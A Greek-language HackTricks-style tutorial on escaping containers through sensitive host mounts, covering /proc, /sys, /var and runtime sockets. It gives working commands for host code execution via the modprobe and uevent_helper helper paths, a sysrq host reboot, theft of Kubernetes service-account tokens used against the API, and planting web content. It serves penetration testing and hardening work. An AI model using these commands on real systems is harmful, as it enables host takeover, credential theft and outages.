# Ευαίσθητα Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Host mounts είναι μία από τις πιο σημαντικές πρακτικές επιφάνειες για container-escape, επειδή συχνά αναστρέφουν μια προσεκτικά απομονωμένη προβολή διεργασιών σε άμεση ορατότητα των πόρων του host. Οι επικίνδυνες περιπτώσεις δεν περιορίζονται στο `/`. Bind mounts όπως `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, ή διαδρομές σχετικές με συσκευές μπορούν να εκθέσουν ελέγχους του πυρήνα, διαπιστευτήρια, τα filesystems γειτονικών containers, και διεπαφές διαχείρισης χρόνου εκτέλεσης.

Αυτή η σελίδα υπάρχει ξεχωριστά από τις μεμονωμένες σελίδες προστασίας επειδή το μοντέλο κατάχρησης είναι διατομεακό. Ένα εγγράψιμο host mount είναι επικίνδυνο εν μέρει εξαιτίας των mount namespaces, εν μέρει εξαιτίας των user namespaces, εν μέρει λόγω της κάλυψης από AppArmor ή SELinux, και εν μέρει λόγω του ποια ακριβώς διαδρομή του host εκτέθηκε. Η αντιμετώπισή του ως ξεχωριστό θέμα κάνει την επιφάνεια επίθεσης πολύ πιο εύκολη στην αξιολόγηση.

## `/proc` Έκθεση

Το procfs περιέχει τόσο κοινές πληροφορίες διεργασιών όσο και διεπαφές ελέγχου του πυρήνα με μεγάλο αντίκτυπο. Ένα bind mount όπως `-v /proc:/host/proc` ή μια προβολή container που εκθέτει απροσδόκητες εγγράψιμες εγγραφές στο proc μπορεί επομένως να οδηγήσει σε αποκάλυψη πληροφοριών, άρνηση εξυπηρέτησης (denial of service), ή απευθείας εκτέλεση κώδικα στον host.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Κατάχρηση

Ξεκινήστε ελέγχοντας ποιες από τις σημαντικές εγγραφές του procfs είναι ορατές ή εγγράψιμες:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Αυτές οι διαδρομές είναι ενδιαφέρουσες για διάφορους λόγους. `core_pattern`, `modprobe`, και `binfmt_misc` μπορούν να γίνουν μονοπάτια host code-execution όταν είναι writable. `kallsyms`, `kmsg`, `kcore`, και `config.gz` είναι ισχυρές πηγές reconnaissance για kernel exploitation. `sched_debug` και `mountinfo` αποκαλύπτουν process, cgroup, και filesystem context που μπορούν να βοηθήσουν στην ανακατασκευή της δομής του host από μέσα στο container.

Η πρακτική αξία κάθε διαδρομής διαφέρει, και η μεταχείρισή τους ως αν είχαν τον ίδιο αντίκτυπο δυσκολεύει το triage:

- `/proc/sys/kernel/core_pattern`
  Αν είναι writable, αυτό είναι ένα από τα πιο υψηλού αντίκτυπου procfs μονοπάτια επειδή ο kernel θα εκτελέσει έναν pipe handler μετά από crash. Ένα container που μπορεί να δείξει το `core_pattern` σε ένα payload αποθηκευμένο στο overlay του ή σε ένα mounted host path μπορεί συχνά να αποκτήσει host code execution. Δείτε επίσης [read-only-paths.md](protections/read-only-paths.md) για ένα αφιερωμένο παράδειγμα.
- `/proc/sys/kernel/modprobe`
  Αυτή η διαδρομή ελέγχει τον userspace helper που χρησιμοποιεί ο kernel όταν πρέπει να επικαλεστεί τη λογική module-loading. Αν είναι writable από το container και ερμηνεύεται στο context του host, μπορεί να γίνει ένας ακόμα host code-execution primitive. Είναι ιδιαίτερα ενδιαφέρουσα όταν συνδυάζεται με τρόπο για να trigger το helper path.
- `/proc/sys/vm/panic_on_oom`
  Συνήθως δεν είναι καθαρό escape primitive, αλλά μπορεί να μετατρέψει την πίεση μνήμης σε host-wide denial of service μετατρέποντας OOM conditions σε kernel panic συμπεριφορά.
- `/proc/sys/fs/binfmt_misc`
  Αν το registration interface είναι writable, ο attacker μπορεί να καταχωρήσει έναν handler για μια επιλεγμένη magic value και να αποκομίσει host-context execution όταν εκτελείται ένα ταιριαστό αρχείο.
- `/proc/config.gz`
  Χρήσιμο για kernel exploit triage. Βοηθάει να προσδιοριστεί ποι subsystems, mitigations και προαιρετικά kernel features είναι ενεργοποιημένα χωρίς να χρειάζονται host package metadata.
- `/proc/sysrq-trigger`
  Κυρίως ένα denial-of-service μονοπάτι, αλλά πολύ σοβαρό. Μπορεί να κάνει reboot, panic, ή με άλλο τρόπο να διαταράξει αμέσως τον host.
- `/proc/kmsg`
  Αποκαλύπτει μηνύματα του kernel ring buffer. Χρήσιμο για host fingerprinting, crash analysis, και σε κάποια περιβάλλοντα για leaking information χρήσιμη στην kernel exploitation.
- `/proc/kallsyms`
  Πολύτιμο όταν είναι readable γιατί αποκαλύπτει exported kernel symbol πληροφορίες και μπορεί να βοηθήσει στην εξουδετέρωση υποθέσεων address randomization κατά την ανάπτυξη kernel exploits.
- `/proc/[pid]/mem`
  Πρόκειται για άμεσο process-memory interface. Αν η στοχευόμενη διαδικασία είναι προσβάσιμη με τις απαραίτητες ptrace-style συνθήκες, μπορεί να επιτρέψει ανάγνωση ή τροποποίηση της μνήμης άλλης διαδικασίας. Ο ρεαλιστικός αντίκτυπος εξαρτάται σε μεγάλο βαθμό από credentials, `hidepid`, Yama και περιορισμούς ptrace, οπότε είναι ένα ισχυρό αλλά υπό όρους μονοπάτι.
- `/proc/kcore`
  Αποκαλύπτει μια core-image-style όψη της συστημικής μνήμης. Το αρχείο είναι τεράστιο και άβολο στη χρήση, αλλά αν είναι ουσιαστικά readable δείχνει μια κακώς εκτεθειμένη επιφάνεια μνήμης του host.
- `/proc/kmem` and `/proc/mem`
  Ιστορικά υψηλού αντίκτυπου raw memory interfaces. Σε πολλά σύγχρονα συστήματα είναι απενεργοποιημένα ή πολύ περιορισμένα, αλλά αν υπάρχουν και είναι χρησιμοποιήσιμα πρέπει να θεωρηθούν κρίσιμα findings.
- `/proc/sched_debug`
  Leaks scheduling και task πληροφορίες που μπορεί να αποκαλύψουν ταυτότητες process του host ακόμη και όταν άλλες προβολές διαδικασιών φαίνονται πιο καθαρές από το αναμενόμενο.
- `/proc/[pid]/mountinfo`
  Εξαιρετικά χρήσιμο για την ανακατασκευή του πού πραγματικά "ζει" το container στον host, ποιες διαδρομές είναι overlay-backed, και αν ένα writable mount αντιστοιχεί σε host content ή μόνο στο layer του container.

Αν το `/proc/[pid]/mountinfo` ή λεπτομέρειες του overlay είναι readable, χρησιμοποιήστε τα για να ανακτήσετε το host path του filesystem του container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Αυτές οι εντολές είναι χρήσιμες επειδή αρκετά host-execution tricks απαιτούν το μετασχηματισμό ενός path μέσα στο container στην αντίστοιχη διαδρομή από την οπτική του host.

### Πλήρες Παράδειγμα: `modprobe` Helper Path Abuse

Εάν το `/proc/sys/kernel/modprobe` είναι εγγράψιμο από το container και το helper path ερμηνεύεται στο πλαίσιο του host, μπορεί να ανακατευθυνθεί σε attacker-controlled payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Η ακριβής ενεργοποίηση εξαρτάται από τον στόχο και τη συμπεριφορά του kernel, αλλά το σημαντικό σημείο είναι ότι μια εγγράψιμη helper path μπορεί να ανακατευθύνει μια μελλοντική kernel helper invocation σε περιεχόμενο host-path ελεγχόμενο από τον attacker.

### Πλήρες Παράδειγμα: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Αν ο στόχος είναι η αξιολόγηση της exploitability αντί για άμεση απόδραση:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Αυτές οι εντολές βοηθούν να απαντηθεί αν χρήσιμες πληροφορίες συμβόλων είναι ορατές, αν πρόσφατα μηνύματα του πυρήνα αποκαλύπτουν ενδιαφέρουσα κατάσταση, και ποιες δυνατότητες ή μετριασμοί του πυρήνα είναι ενσωματωμένες στη μεταγλώττιση. Το αποτέλεσμα συνήθως δεν είναι άμεσο escape, αλλά μπορεί να μειώσει δραστικά τον χρόνο διαλογής ευπαθειών του πυρήνα.

### Full Example: SysRq Host Reboot

Αν το `/proc/sysrq-trigger` είναι εγγράψιμο και προβάλλεται στο host:
```bash
echo b > /proc/sysrq-trigger
```
Το αποτέλεσμα είναι άμεση επανεκκίνηση του host. Αυτό δεν είναι ένα διακριτικό παράδειγμα, αλλά δείχνει καθαρά ότι η έκθεση του procfs μπορεί να είναι πολύ πιο σοβαρή από την απλή αποκάλυψη πληροφοριών.

## `/sys` Έκθεση

Το sysfs εκθέτει μεγάλες ποσότητες κατάστασης kernel και συσκευών. Κάποιες διαδρομές του sysfs είναι κυρίως χρήσιμες για fingerprinting, ενώ άλλες μπορούν να επηρεάσουν helper execution, τη συμπεριφορά των συσκευών, τη διαμόρφωση security-module ή την κατάσταση του firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Αυτές οι διαδρομές έχουν σημασία για διαφορετικούς λόγους. Το `/sys/class/thermal` μπορεί να επηρεάσει τη συμπεριφορά thermal-management και επομένως τη σταθερότητα του host σε περιβάλλοντα όπου είναι άσχημα εκτεθειμένο. Το `/sys/kernel/vmcoreinfo` μπορεί να leak crash-dump και πληροφορίες kernel-layout που βοηθούν στο low-level host fingerprinting. Το `/sys/kernel/security` είναι το interface `securityfs` που χρησιμοποιούν τα Linux Security Modules, οπότε μια απρόσμενη πρόσβαση εκεί μπορεί να εκθέσει ή να αλλάξει κατάσταση σχετική με MAC. Οι διαδρομές των EFI variables μπορούν να επηρεάσουν firmware-backed ρυθμίσεις εκκίνησης, καθιστώντας τες πολύ πιο σοβαρές από απλά αρχεία διαμόρφωσης. Το `debugfs` κάτω από το `/sys/kernel/debug` είναι ιδιαίτερα επικίνδυνο επειδή είναι σκόπιμα μια developer-oriented διεπαφή με πολύ λιγότερες προσδοκίες ασφαλείας σε σχέση με τα hardened production-facing kernel APIs.

Χρήσιμες εντολές για έλεγχο αυτών των διαδρομών είναι:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Τι καθιστά αυτές τις εντολές ενδιαφέρουσες:

- `/sys/kernel/security` μπορεί να αποκαλύψει εάν το AppArmor, το SELinux, ή κάποια άλλη LSM επιφάνεια είναι ορατή με τρόπο που θα έπρεπε να παρέμενε μόνο στον host.
- `/sys/kernel/debug` είναι συχνά το πιο ανησυχητικό εύρημα σε αυτή την ομάδα. Εάν το `debugfs` είναι mounted και αναγνώσιμο ή εγγράψιμο, αναμένετε μια ευρεία επιφάνεια προσανατολισμένη προς τον kernel, του οποίου ο ακριβής κίνδυνος εξαρτάται από τους ενεργοποιημένους debug nodes.
- Η έκθεση μεταβλητών EFI είναι λιγότερο συχνή, αλλά αν υπάρχει έχει υψηλό αντίκτυπο επειδή επηρεάζει ρυθμίσεις που υποστηρίζονται από firmware αντί για απλά αρχεία χρόνου εκτέλεσης.
- `/sys/class/thermal` αφορά κυρίως τη σταθερότητα του host και την αλληλεπίδραση με το hardware, όχι διαφυγές τύπου shell.
- `/sys/kernel/vmcoreinfo` είναι κυρίως πηγή για host-fingerprinting και crash-analysis, χρήσιμη για την κατανόηση της χαμηλού επιπέδου κατάστασης του kernel.

### Πλήρες Παράδειγμα: `uevent_helper`

Αν το `/sys/kernel/uevent_helper` είναι εγγράψιμο, ο kernel μπορεί να εκτελέσει έναν helper υπό τον έλεγχο του επιτιθέμενου όταν ενεργοποιείται ένα `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Ο λόγος που αυτό λειτουργεί είναι ότι το helper path ερμηνεύεται από την οπτική του host. Μόλις ενεργοποιηθεί, το helper εκτελείται στο context του host αντί μέσα στο τρέχον container.

## `/var` Έκθεση

Η τοποθέτηση του `/var` του host μέσα σε ένα container συχνά υποτιμάται επειδή δεν φαίνεται τόσο δραματική όσο η τοποθέτηση του `/`. Στην πράξη μπορεί να αρκεί για να προσεγγίσει runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens και τα γειτονικά application filesystems. Σε σύγχρονους nodes, το `/var` είναι συχνά όπου ζει το πιο λειτουργικά ενδιαφέρον container state.

### Kubernetes Παράδειγμα

Ένα pod με `hostPath: /var` μπορεί συχνά να διαβάσει τα projected tokens άλλων pods και το overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες επειδή απαντούν εάν το mount εκθέτει μόνο μη κρίσιμα δεδομένα εφαρμογής ή cluster credentials με υψηλό αντίκτυπο. Ένα αναγνώσιμο service-account token μπορεί αμέσως να μετατρέψει local code execution σε πρόσβαση στο Kubernetes API.

Αν το token υπάρχει, επιβεβαιώστε τι μπορεί να προσεγγίσει αντί να σταματήσετε στην token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Το αντίκτυπο εδώ μπορεί να είναι πολύ μεγαλύτερο από την τοπική πρόσβαση στον κόμβο. Ένα token με ευρεία RBAC μπορεί να μετατρέψει ένα προσαρτημένο `/var` σε παραβίαση ολόκληρου του cluster.

### Docker And containerd Παράδειγμα

Σε Docker hosts τα σχετικά δεδομένα συχνά βρίσκονται κάτω από `/var/lib/docker`, ενώ σε Kubernetes nodes που τρέχουν containerd μπορεί να βρίσκονται κάτω από `/var/lib/containerd` ή σε snapshotter-specific paths:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Εάν το προσαρτημένο `/var` εκθέτει εγγράψιμα snapshot περιεχόμενα από άλλο workload, ο attacker μπορεί να τροποποιήσει αρχεία εφαρμογής, να τοποθετήσει web content ή να αλλάξει startup scripts χωρίς να πειράξει την τρέχουσα container configuration.

Συγκεκριμένες ιδέες κατάχρησης μόλις βρεθεί εγγράψιμο snapshot περιεχόμενο:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Αυτές οι εντολές είναι χρήσιμες επειδή δείχνουν τις τρεις κύριες οικογένειες επιπτώσεων του προσαρτημένου `/var`: application tampering, secret recovery, and lateral movement into neighboring workloads.

## Sockets χρόνου εκτέλεσης

Τα ευαίσθητα host mounts συχνά περιλαμβάνουν sockets χρόνου εκτέλεσης αντί για πλήρεις καταλόγους. Αυτά είναι τόσο σημαντικά που αξίζουν ρητή επανάληψη εδώ:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Δείτε [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) για πλήρεις ροές εκμετάλλευσης μόλις ένα από αυτά τα sockets είναι mounted.

Ως ένα γρήγορο πρώτο μοτίβο αλληλεπίδρασης:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Αν κάποιο από αυτά επιτύχει, η διαδρομή από "mounted socket" στο "start a more privileged sibling container" συνήθως είναι πολύ πιο σύντομη από οποιαδήποτε kernel breakout path.

## CVE που σχετίζονται με mounts

Τα host mounts επίσης αλληλεπιδρούν με runtime ευπάθειες. Σημαντικά πρόσφατα παραδείγματα περιλαμβάνουν:

- `CVE-2024-21626` in `runc`, όπου ένα leaked directory file descriptor θα μπορούσε να τοποθετήσει τον working directory στο host filesystem.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, όπου OverlayFS copy-up races θα μπορούσαν να παράγουν host-path εγγραφές κατά τη διάρκεια των builds.
- `CVE-2024-1753` in Buildah and Podman build flows, όπου crafted bind mounts κατά τη διάρκεια του build θα μπορούσαν να εκθέσουν το `/` ως read-write.
- `CVE-2024-40635` in containerd, όπου μια μεγάλη τιμή του `User` θα μπορούσε να υπερχειλίσει και να οδηγήσει σε συμπεριφορά UID 0.

Αυτά τα CVE έχουν σημασία εδώ επειδή δείχνουν ότι ο χειρισμός των mounts δεν αφορά μόνο τη διαμόρφωση από τον operator. Το runtime από μόνο του μπορεί επίσης να εισαγάγει συνθήκες διαφυγής που προκαλούνται από mounts.

## Έλεγχοι

Χρησιμοποιήστε αυτές τις εντολές για να εντοπίσετε γρήγορα τις πιο κρίσιμες εκθέσεις mounts:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Το host root, `/proc`, `/sys`, `/var`, και τα runtime sockets είναι όλα ευρήματα υψηλής προτεραιότητας.
- Οι εγγράψιμες εγγραφές proc/sys συχνά σημαίνουν ότι το mount εκθέτει host-global kernel controls αντί για μια ασφαλή προβολή του container.
- Τα mounted `/var` paths αξίζουν έλεγχο διαπιστευτηρίων και ανασκόπηση των γειτονικών workloads, όχι μόνο έλεγχο του filesystem.
